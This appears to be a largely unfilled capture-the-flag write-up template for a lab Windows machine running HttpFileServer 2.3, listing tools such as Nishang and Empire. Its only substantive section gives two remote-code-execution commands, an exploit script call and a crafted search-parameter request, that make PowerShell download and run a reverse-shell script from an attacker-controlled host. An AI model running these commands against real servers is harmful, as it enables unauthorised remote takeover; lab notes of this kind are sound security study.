Name & IP Address of Machine:
> NAME : `<IP>`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Tools Used.](#tools-used)

<!-- /TOC -->



## Synopsis


## Enumeration
Opened Ports: 
- [ ] 80(httpfileserver 2.3)
Vulnerable to rce. The old windows has SysNative(64-bit) or SysWow64(32-bit) architecture folder instead of system32 that is where they put their system executables.
```bash
python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28:8000/rev_tcp.ps1')"
```
OR
```bash 
curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.10.8' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' \
    -b $'HFS_SID=0.132836493197829' \
    $'http://10.10.10.8/?search=%00{.exec|c%3a\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe+IEX(New-Object+Net.Webclient).downloadString(\'http%3a//10.10.14.28%3a8000/Invoke-PowershellTcp.ps1\').}'
```

## FootHold

## Lateral Movement

## Privilege Escalation




<!-- ## Thank You 
🕉️  -->


## Tools Used.
- [ ] Nishang Shell
- [ ] Powershell
- [ ] Empire
- [ ] sherlok